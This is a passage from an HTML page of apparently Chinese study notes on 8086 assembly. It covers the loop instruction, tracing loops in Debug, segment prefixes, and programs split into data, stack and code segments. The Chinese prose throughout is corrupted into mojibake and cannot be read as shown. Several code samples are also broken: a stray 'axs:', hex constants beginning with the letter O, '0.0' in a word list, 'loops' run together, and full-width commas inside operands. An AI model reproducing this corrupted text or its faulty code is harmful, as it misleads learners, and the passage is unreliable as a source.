‡è¯†åœ°å€è¦åœ¨å‰é¢&#x3D;&#x3D;</strong></p><p>(3)<strong>&#x3D;&#x3D;è¦å¾ªç¯æ‰§è¡Œçš„ç¨‹åºæ®µï¼Œè¦å†™åœ¨æ ‡å·å’Œ loop æŒ‡ä»¤çš„ä¸­é—´&#x3D;&#x3D;</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov cx,å¾ªç¯æ¬¡æ•°</span><br><span class="line">s:</span><br><span class="line">å¾ªç¯æ‰§è¡Œçš„ç¨‹åºæ®µ</span><br><span class="line">loop s</span><br></pre></td></tr></table></figure><p>ä¾‹å­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">mov axï¼Œ2</span><br><span class="line"></span><br><span class="line">mov cx,11</span><br><span class="line">s:add ax,axs:</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov axï¼Œ4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>(1) æ ‡å·**&#x3D;&#x3D;s&#x3D;&#x3D;**<br>    åœ¨æ±‡ç¼–è¯­è¨€ä¸­ï¼Œæ ‡å·ä»£è¡¨ä¸€ä¸ªåœ°å€ï¼Œç¨‹åºä¸­æœ‰ä¸€ä¸ªæ ‡å· <strong>&#x3D;&#x3D;s&#x3D;&#x3D;<strong>ã€‚å®ƒå®é™…ä¸Šæ ‡è¯†äº†ä¸€ä¸ªåœ°å€ï¼Œè¿™ä¸ªåœ°å€å¤„æœ‰ä¸€æ¡æŒ‡ä»¤:</strong>&#x3D;&#x3D;add ax,ax&#x3D;&#x3D;<strong>ã€‚<br>(2) loop s<br>CPUæ‰§è¡Œ loopsçš„æ—¶å€™ï¼Œè¦è¿›è¡Œ</strong>ä¸¤æ­¥æ“ä½œ</strong>:<br>&#x3D;&#x3D;<strong>1.(cx)&#x3D;(cx)-1;</strong>&#x3D;&#x3D;<br><strong>&#x3D;&#x3D;2.åˆ¤æ–­ cxä¸­çš„å€¼ï¼Œä¸ä¸º 0åˆ™è½¬è‡³æ ‡å·sæ‰€çš„åœ°å€å¤„æ‰§è¡Œ(è¿™é‡Œçš„æŒ‡æ˜¯ add ax,ax)å¦‚æœä¸ºé›¶åˆ™æ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤(ä¸‹ä¸€æ¡æŒ‡ä»¤æ˜¯mov ax,4c00h)ã€‚&#x3D;&#x3D;</strong><br>(3) ä»¥ä¸‹3æ¡æŒ‡ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov cxï¼Œ11</span><br><span class="line">s:add ax,ax</span><br><span class="line">loop s</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œ <strong>loop s</strong> æ—¶ï¼Œ<strong>é¦–å…ˆè¦å°†(cx)å‡ 1ï¼Œç„¶åè‹¥(cx)ä¸ä¸º0ï¼Œåˆ™å‘å‰è½¬è‡³ s å¤„æ‰§è¡Œadd ax,ax</strong>ã€‚æ‰€ä»¥ï¼Œ<strong>å¯ä»¥åˆ©ç”¨cxæ¥æ§åˆ¶add ax,ax çš„æ‰§è¡Œæ¬¡æ•°ã€‚</strong></p><h4 id="5-3-åœ¨Debug-ä¸­è·Ÿè¸ªç”¨-loop-æŒ‡ä»¤å®ç°çš„å¾ªç¯ç¨‹åº"><a href="#5-3-åœ¨Debug-ä¸­è·Ÿè¸ªç”¨-loop-æŒ‡ä»¤å®ç°çš„å¾ªç¯ç¨‹åº" class="headerlink" title="5.3 åœ¨Debug ä¸­è·Ÿè¸ªç”¨ loop æŒ‡ä»¤å®ç°çš„å¾ªç¯ç¨‹åº"></a>5.3 åœ¨Debug ä¸­è·Ÿè¸ªç”¨ loop æŒ‡ä»¤å®ç°çš„å¾ªç¯ç¨‹åº</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">mov ax,0ffffh//åœ¨æ±‡ç¼–æºç¨‹åºä¸­ï¼Œæ•°æ®ä¸èƒ½ä»¥å­—æ¯å¼€å¤´</span><br><span class="line">mov ds,ax</span><br><span class="line">mov bxï¼Œ6</span><br><span class="line"></span><br><span class="line">mov alï¼Œ[bx]</span><br><span class="line">mov ah,0</span><br><span class="line">mov dx,0</span><br><span class="line"></span><br><span class="line">mov cxï¼Œ3</span><br><span class="line">s: add dx,ax//ç¬¬12è¡Œ</span><br><span class="line">loops</span><br><span class="line">mov axï¼Œ4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>å¾ªç¯ç¨‹åºæ®µä»CS:0012å¼€å§‹ï¼Œæˆ‘ä»¬ä¸æƒ³å†ä¸€æ­¥æ­¥åœ°è·Ÿè¸ªCS:0012å‰é¢çš„æŒ‡ä»¤ï¼Œä» CS:0012 å¤„å¼€å§‹è·Ÿè¸ªã€‚**&#x3D;&#x3D;å¯ä»¥è¿™æ ·æ¥ä½¿ç”¨g å‘½ä»¤ï¼Œâ€œg 0012â€&#x3D;&#x3D;**</p><p>å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ç”¨gå‘½ä»¤æ¥è¾¾åˆ°ç›®çš„ï¼Œ<strong>å¯ä»¥ç”¨â€œg 0016â€ç›´æ¥æ‰§è¡Œåˆ° CS:0016 å¤„</strong></p><p>æˆ‘ä»¬å¸Œæœ›å°†å¾ªç¯ä¸€æ¬¡æ‰§è¡Œå®Œã€‚å¯ä»¥ä½¿ç”¨ p å‘½ä»¤æ¥è¾¾åˆ°ç›®çš„ã€‚å†æ¬¡é‡åˆ°loop æŒ‡ä»¤æ—¶ï¼Œ<strong>ä½¿ç”¨på‘½ä»¤æ¥æ‰§è¡Œ</strong>ï¼ŒDebug å°±ä¼šè‡ªåŠ¨é‡å¤æ‰§è¡Œå¾ªç¯ä¸­çš„æŒ‡ä»¤ï¼Œç›´åˆ°(cx)&#x3D;0ä¸ºæ­¢ã€‚</p><h4 id="5-4-Debug-å’Œæ±‡ç¼–ç¼–è¯‘å™¨-masm-å¯¹æŒ‡ä»¤çš„ä¸åŒå¤„ç†"><a href="#5-4-Debug-å’Œæ±‡ç¼–ç¼–è¯‘å™¨-masm-å¯¹æŒ‡ä»¤çš„ä¸åŒå¤„ç†" class="headerlink" title="5.4 Debug å’Œæ±‡ç¼–ç¼–è¯‘å™¨ masm å¯¹æŒ‡ä»¤çš„ä¸åŒå¤„ç†"></a>5.4 Debug å’Œæ±‡ç¼–ç¼–è¯‘å™¨ masm å¯¹æŒ‡ä»¤çš„ä¸åŒå¤„ç†</h4><p>â€œmov al,[0]â€ï¼Œå«ä¹‰:(al)&#x3D;0ï¼Œå°†å¸¸é‡0é€å…¥alä¸­(ä¸mov al,0å«ä¹‰ç›¸åŒ)</p><p>â€œmov al,ds:[0]â€ï¼Œå«ä¹‰:(al)&#x3D;((ds)*16+0)ï¼Œå°†å†…å­˜å•å…ƒä¸­çš„æ•°æ®é€å…¥alä¸­;</p><p>â€œmov al,[bx]â€ï¼Œå«ä¹‰:(al)&#x3D;((ds)*16+(bx))ï¼Œå°†å†…å­˜å•å…ƒä¸­çš„æ•°æ®é€å…¥alä¸­</p><p>â€œmov al,ds:[bx]â€ï¼Œå«ä¹‰:ä¸â€œmov al,[bx]â€ç›¸åŒã€‚</p><p>ä»ä¸Šé¢çš„æ¯”è¾ƒä¸­å¯ä»¥çœ‹å‡º:<br>(1)åœ¨æ±‡ç¼–æºç¨‹åºä¸­ï¼Œå¦‚æœç”¨æŒ‡ä»¤è®¿é—®ä¸€ä¸ªå†…å­˜å•å…ƒï¼Œåˆ™åœ¨æŒ‡ä»¤ä¸­å¿…é¡»ç”¨â€œ[â€¦]â€æ¥è¡¨ç¤ºå†…å­˜å•å…ƒï¼Œå¦‚æœåœ¨â€œ[]â€é‡Œç”¨ä¸€ä¸ªå¸¸é‡ idata ç›´æ¥ç»™å‡ºå†…å­˜å•å…ƒçš„åç§»åœ°å€ï¼Œå°±è¦<strong>åœ¨â€œ[]â€çš„å‰é¢</strong>æ˜¾å¼åœ°<strong>ç»™å‡ºæ®µåœ°å€æ‰€åœ¨çš„æ®µå¯„å­˜å™¨ã€‚</strong>æ¯”å¦‚<br><strong>mov al,ds:[0]</strong><br>å¦‚æœ<strong>æ²¡æœ‰åœ¨â€œ[]â€çš„å‰é¢</strong>æ˜¾å¼åœ°<strong>ç»™å‡ºæ®µåœ°å€æ‰€åœ¨çš„æ®µå¯„å­˜å™¨</strong>ï¼Œæ¯”å¦‚<br><strong>mov al,[0]</strong><br>é‚£ä¹ˆï¼Œ<strong>ç¼–è¯‘å™¨masmå°†æŠŠæŒ‡ä»¤ä¸­çš„â€œ[idata]â€è§£é‡Šä¸ºâ€œidataâ€</strong><br>(2) å¦‚æœåœ¨â€œ[]â€é‡Œç”¨å¯„å­˜å™¨ï¼Œ<strong>æ¯”å¦‚ bxï¼Œé—´æ¥ç»™å‡ºå†…å­˜å•å…ƒçš„åç§»åœ°å€</strong>ï¼Œ<strong>åˆ™æ®µåœ°å€é»˜è®¤åœ¨ ds ä¸­</strong>ã€‚å½“ç„¶ï¼Œ<strong>ä¹Ÿå¯ä»¥æ˜¾å¼åœ°ç»™å‡ºæ®µåœ°å€æ‰€åœ¨çš„æ®µå¯„å­˜å™¨ã€‚</strong></p><h4 id="5-5-loop-å’Œ-bx-çš„è”åˆåº”ç”¨"><a href="#5-5-loop-å’Œ-bx-çš„è”åˆåº”ç”¨" class="headerlink" title="5.5 loop å’Œ[bx]çš„è”åˆåº”ç”¨"></a>5.5 loop å’Œ[bx]çš„è”åˆåº”ç”¨</h4><p>è®¡ç®—ffff:0~ffff:bå•å…ƒä¸­çš„æ•°æ®çš„å’Œï¼Œç»“æœå­˜å‚¨åœ¨dxä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">mov ax,Offffh</span><br><span class="line">mov ds,ax</span><br><span class="line">mov bxï¼Œ0;åˆå§‹åŒ–ds:bxæŒ‡å‘ ffff:0</span><br><span class="line"></span><br><span class="line">mov dxï¼Œ0;åˆå§‹åŒ–ç´¯åŠ å¯„å­˜å™¨dxï¼Œ(dx)=0</span><br><span class="line">mov cxï¼Œ12;åˆå§‹åŒ–å¾ªç¯è®¡æ•°å¯„å­˜å™¨ cxï¼Œ(cx)=12</span><br><span class="line"></span><br><span class="line">s:mov alï¼Œ[bx]</span><br><span class="line">mov ahï¼Œ0</span><br><span class="line">add dx,ax ;é—´æ¥å‘ dxä¸­åŠ ä¸Š((ds)*16+(bx))å•å…ƒçš„æ•°å€¼</span><br><span class="line">inc bx ;ds:bx æŒ‡å‘ä¸‹ä¸€ä¸ªå•å…ƒ</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov axï¼Œ4c00h</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>8ä½å­—èŠ‚å‹æ•°ç´¯åŠ ç»“æœå­˜å…¥16ä½å­—å‹dxä¸­</p><p>1.å°†8ä½å­—èŠ‚å‹æ•°æ®å­˜å…¥ä¸­é—´æš‚å­˜16ä½å­—å‹axä¸­ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov alï¼Œ[bx]</span><br><span class="line">mov ahï¼Œ0</span><br></pre></td></tr></table></figure><p>2.å°†16ä½axä¸­çš„æ•°æ®è½¬å…¥åˆ°dxä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add dx,ax</span><br></pre></td></tr></table></figure><p>3.è®¾è®¡å¾ªç¯ï¼Œå¯æŠŠbxï¼ˆbxå·²ç»åˆå§‹åŒ–ä¸º0ï¼‰å½“ä½œä¸ºä¸­é—´å˜é‡ï¼Œåœ¨å¾ªç¯çš„æœ«å°¾åŠ ä¸Šä¸€å¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inc bx</span><br></pre></td></tr></table></figure><h4 id="5-6æ®µå‰ç¼€"><a href="#5-6æ®µå‰ç¼€" class="headerlink" title="5.6æ®µå‰ç¼€"></a>5.6æ®µå‰ç¼€</h4><p>ç”¨äºæ˜¾å¼åœ°æŒ‡æ˜å†…å­˜å•å…ƒçš„æ®µåœ°å€çš„â€œds:â€ â€œcs:â€ â€œss:â€ â€œes:â€åœ¨æ±‡ç¼–è¯­è¨€ä¸­ç§°ä¸ºæ®µå‰ç¼€</p><p>ä¾‹å¦‚<strong>mov ax,ds:[bx]</strong> ä¸­çš„ds:</p><h4 id="5-7-ä¸€æ®µå®‰å…¨çš„ç©ºé—´"><a href="#5-7-ä¸€æ®µå®‰å…¨çš„ç©ºé—´" class="headerlink" title="5.7 ä¸€æ®µå®‰å…¨çš„ç©ºé—´"></a>5.7 ä¸€æ®µå®‰å…¨çš„ç©ºé—´</h4><p>(1)æˆ‘ä»¬éœ€è¦ç›´æ¥å‘ä¸€æ®µå†…å­˜ä¸­å†™å…¥å†…å®¹:</p><p>(2)è¿™æ®µå†…å­˜ç©ºé—´ä¸åº”å­˜æ”¾ç³»ç»Ÿæˆ–å…¶ä»–ç¨‹åºçš„æ•°æ®æˆ–ä»£ç ï¼Œå¦åˆ™å†™å…¥æ“ä½œå¾ˆå¯èƒ½å¼•å‘é”™è¯¯;</p><p>(3) DOS æ–¹å¼ä¸‹ï¼Œä¸€èˆ¬æƒ…å†µï¼Œ0:20~0:2ff ç©ºé—´ä¸­æ²¡æœ‰ç³»ç»Ÿæˆ–å…¶ä»–ç¨‹åºçš„æ•°æ®æˆ–ä»£ç ;(å¯ä»¥å…ˆç”¨debugæ£€æŸ¥ä¸€ä¸‹)</p><p>(4)ä»¥åï¼Œæˆ‘ä»¬éœ€è¦ç›´æ¥å‘ä¸€æ®µå†…å­˜ä¸­å†™å…¥å†…å®¹æ—¶ï¼Œå°±ä½¿ç”¨ 0:200~0:2ffè¿™ç©ºé—´</p><h4 id="5-8æ®µå‰ç¼€çš„ä½¿ç”¨"><a href="#5-8æ®µå‰ç¼€çš„ä½¿ç”¨" class="headerlink" title="5.8æ®µå‰ç¼€çš„ä½¿ç”¨"></a>5.8æ®µå‰ç¼€çš„ä½¿ç”¨</h4><p>å°†å†…å­˜ffff:0<del>ffff:bå•å…ƒä¸­çš„æ•°æ®å¤åˆ¶åˆ°0:200</del>0:20b å•å…ƒä¸­</p><p>0:200<del>0:20bâ†’0020:0</del>0020:b</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">mov ax,0ffffh</span><br><span class="line">mov ds,ax;ç”¨ ds å­˜æ”¾æºå§‹ç©ºé—´ffff:0~ffff:b çš„æ®µåœ°å€ã€‚</span><br><span class="line"></span><br><span class="line">mov ax,0020h</span><br><span class="line">mov es,ax;ç”¨es å­˜æ”¾æ ‡ç©ºé—´ 0020:00020:b çš„æ®µåœ°å€</span><br><span class="line"></span><br><span class="line">mov cx,12</span><br><span class="line">mov bx,0</span><br><span class="line"></span><br><span class="line">s:mov dl,[bx]</span><br><span class="line">mov es:[bx],dl;æ˜¾å¼åœ°ç”¨æ®µå‰ç¼€â€œes:â€ç»™å‡ºå•å…ƒçš„æ®µåœ°å€ï¼Œè¿™æ ·å°±ä¸å¿…åœ¨å¾ªç¯ä¸­é‡å¤è®¾ç½® dsã€‚</span><br><span class="line">inc bx</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h2 id="ç¬¬6ç« åŒ…å«å¤šä¸ªæ®µçš„ç¨‹åº"><a href="#ç¬¬6ç« åŒ…å«å¤šä¸ªæ®µçš„ç¨‹åº" class="headerlink" title="ç¬¬6ç« åŒ…å«å¤šä¸ªæ®µçš„ç¨‹åº"></a>ç¬¬6ç« åŒ…å«å¤šä¸ªæ®µçš„ç¨‹åº</h2><h4 id="6-1åœ¨ä»£ç æ®µä¸­ä½¿ç”¨æ•°æ®"><a href="#6-1åœ¨ä»£ç æ®µä¸­ä½¿ç”¨æ•°æ®" class="headerlink" title="6.1åœ¨ä»£ç æ®µä¸­ä½¿ç”¨æ•°æ®"></a>6.1åœ¨ä»£ç æ®µä¸­ä½¿ç”¨æ•°æ®</h4><p>æˆ‘ä»¬è‹¥è¦ CPUä»ä½•å¤„å¼€å§‹æ‰§è¡Œç¨‹åºï¼Œ<strong>åªè¦åœ¨æºç¨‹åºä¸­ç”¨â€œend æ ‡å·â€æŒ‡æ˜å°±å¯ä»¥äº†ã€‚</strong><br>æœ‰äº†è¿™ç§æ–¹æ³•ï¼Œå°±å¯ä»¥è¿™æ ·æ¥å®‰æ’ç¨‹åºçš„æ¡†æ¶:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">:</span><br><span class="line">:</span><br><span class="line">æ•°æ®</span><br><span class="line">:</span><br><span class="line">:</span><br><span class="line">start:</span><br><span class="line">:</span><br><span class="line">:</span><br><span class="line">ä»£ç </span><br><span class="line">:</span><br><span class="line">:</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>è€ƒè™‘è¿™æ ·ä¸€ä¸ªé—®é¢˜ï¼Œç¼–ç¨‹è®¡ç®—ä»¥ä¸‹8ä¸ªæ•°æ®çš„å’Œï¼Œç»“æœå­˜åœ¨axå¯„å­˜å™¨ä¸­:</p><p>0123hã€0456hã€0789hã€0abchã€0defhã€0fedhã€0cbahã€0987h</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">dw 0123h,0456h,0789h,0abch,Odefh,0fedh,0cbah,0987h</span><br><span class="line">start:mov bx,0</span><br><span class="line">mov axï¼Œ0</span><br><span class="line"></span><br><span class="line">mov cx,8</span><br><span class="line">s:add ax,cs:[bx]</span><br><span class="line">add bx,2</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov axï¼Œ4c00h</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>â€‹ç¨‹åºä¸­çš„â€œdwâ€çš„å«ä¹‰æ˜¯<strong>å®šä¹‰å­—å‹æ•°æ®</strong>ã€‚**dw å³â€œdefinewordâ€™â€™**åœ¨è¿™é‡Œï¼Œä½¿ç”¨ dw å®šä¹‰äº† 8 ä¸ªå­—å‹æ•°æ®(æ•°æ®ä¹‹é—´ä»¥å·åˆ†éš”)ï¼Œå®ƒä»¬æ‰€å çš„å†…å­˜ç©ºé—´çš„å¤§å°ä¸º16ä¸ªå­—èŠ‚ã€‚</p><h4 id="6-2åœ¨ä»£ç æ®µä¸­ä½¿ç”¨æ ˆ"><a href="#6-2åœ¨ä»£ç æ®µä¸­ä½¿ç”¨æ ˆ" class="headerlink" title="6.2åœ¨ä»£ç æ®µä¸­ä½¿ç”¨æ ˆ"></a>6.2åœ¨ä»£ç æ®µä¸­ä½¿ç”¨æ ˆ</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">dw 0123h,0456h,0789h,0abch,0defh,Ofedh,0cbah,0987h</span><br><span class="line">dw 0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0</span><br><span class="line">;ç”¨dwå®šä¹‰16ä¸ªå­—å‹æ•°æ®ï¼Œåœ¨ç¨‹åºåŠ è½½åï¼Œå°†å–å¾—16ä¸ªå­—çš„</span><br><span class="line">;å†…å­˜ç©ºé—´ï¼Œå­˜æ”¾è¿™16ä¸ªæ•°æ®ã€‚åœ¨åé¢çš„ç¨‹åºä¸­å°†è¿™æ®µ</span><br><span class="line">;ç©ºé—´å½“ä½œæ ˆæ¥ä½¿ç”¨</span><br><span class="line"></span><br><span class="line">start:mov aX,CS</span><br><span class="line">mov ssï¼Œax</span><br><span class="line">mov spï¼Œ30h;å°†è®¾ç½®æ ˆé¡¶ss:spæŒ‡cs:30</span><br><span class="line"></span><br><span class="line">mov bxï¼Œ0</span><br><span class="line">mov cxï¼Œ8</span><br><span class="line">s:push cs:[bx]</span><br><span class="line">add bx,2</span><br><span class="line">loop s;ä»¥ä¸Šå°†ä»£ç æ®µ0~15å•å…ƒä¸­çš„8ä¸ªå­—å‹æ•°æ®</span><br><span class="line">;ä¾æ¬¡å…¥æ ˆ</span><br><span class="line"></span><br><span class="line">mov cXï¼Œ8</span><br><span class="line">mov bxï¼Œ0</span><br><span class="line">s0:pop cs:[bx]</span><br><span class="line">add bxï¼Œ2</span><br><span class="line">loop s0;ä»¥ä¸Šä¾æ¬¡å‡ºæ ˆ8ä¸ªå­—å‹æ•°æ®åˆ°ä»£ç æ®µ0~15å•å…ƒä¸­</span><br><span class="line"></span><br><span class="line">mov axï¼Œ4c00h</span><br><span class="line">int 21h</span><br><span class="line">codesg ends</span><br><span class="line">end start;æŒ‡æ˜ç¨‹åºçš„å…¥å£åœ¨startå¤„</span><br></pre></td></tr></table></figure><p>ç›‘æµ‹ç‚¹6.1</p><p>csæ˜¯ä»£ç æ®µå¯„å­˜å™¨ï¼Œæ‰€ä»¥æ”¹å†™ç¨‹åºä¸­çš„æ•°æ®å°±æ˜¯æ”¹å†™cs:ipçš„æ•°æ®æ‰€ä»¥è¦mov cs:[bx],ax</p><h4 id="6-3å°†æ•°æ®ã€ä»£ç ã€æ ˆæ”¾å…¥ä¸åŒçš„æ®µ"><a href="#6-3å°†æ•°æ®ã€ä»£ç ã€æ ˆæ”¾å…¥ä¸åŒçš„æ®µ" class="headerlink" title="6.3å°†æ•°æ®ã€ä»£ç ã€æ ˆæ”¾å…¥ä¸åŒçš„æ®µ"></a>6.3å°†æ•°æ®ã€ä»£ç ã€æ ˆæ”¾å…¥ä¸åŒçš„æ®µ</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code,ds:data,ss:stack</span><br><span class="line"></span><br><span class="line">data segment</span><br><span class="line">dw 0123hï¼Œ0456h,0789h,0abch,Odefh,Ofedh,0cbah,0987h</span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">stack segment</span><br><span class="line">dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0</span><br><span class="line">stack ends</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">start:mov ax,stack</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,20h;è®¾ç½®æ ˆé¡¶ss:spæŒ‡å‘ stack:20</span><br><span class="line"></span><br><span class="line">mov ax,data</span><br><span class="line">mov ds,ax;dsæŒ‡å‘dataæ®µ</span><br><span class="line"></span><br><span class="line">mov bx,0;ds:bxæŒ‡å‘ dataæ®µä¸­çš„ç¬¬ä¸€ä¸ªå•å…ƒ</span><br><span class="line"></span><br><span class="line">mov cx,8</span><br><span class="line">s:push [bx]</span><br><span class="line">add bx,2</span><br><span class="line">loop s;ä»¥ä¸Šå°†dataæ®µä¸­çš„0~15å•å…ƒä¸­çš„8ä¸ªå­—å‹æ•°æ®ä¾æ¬¡å…¥æ ˆ</span><br><span class="line"></span><br><span class="line">mov bxï¼Œ0</span><br><span class="line"></span><br><span class="line">mov cxï¼Œ8</span><br><span class="line">s0:pop [bx]</span><br><span class="line">add bx,2</span><br><span class="line">loop s0;ä»¥ä¸Šä¾æ¬¡å‡ºæ ˆ8ä¸ªå­—å‹æ•°æ®åˆ°dataæ®µçš„0~15å•å…ƒä¸­</span><br><span class="line"></span><br><span class="line">mov axï¼Œ4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>(1)å®šä¹‰å¤šä¸ªæ®µçš„æ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assume å¯„å­˜å™¨å:[name]</span><br><span class="line">[name] segment</span><br><span class="line">æ•°æ®å†…å®¹</span><br><span class="line">[name] ends</span><br></pre></td></tr></table></figure><p>(2)å¯¹æ®µåœ°å€çš„å¼•ç”¨</p><p>è¦æŠŠdata:6é€å…¥bxä¸­</p><p><strong>è¦ç”¨</strong>ä¸‹é¢ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,data</span><br><span class="line">mov ds,ax</span><br><span class="line">mov bx,ds:[6]</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬<strong>ä¸èƒ½</strong>ç”¨ä¸‹é¢çš„æŒ‡ä»¤:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ds,data</span><br><span class="line">mov bx,ds:[6]</span><br></pre></td></tr></table></figure><p>(3)â€œä»£ç æ®µâ€æ•°æ®æ®µâ€â€œæ ˆæ®µâ€å®Œå…¨æ˜¯æˆ‘ä»¬çš„å®‰æ’</p><p>CPU 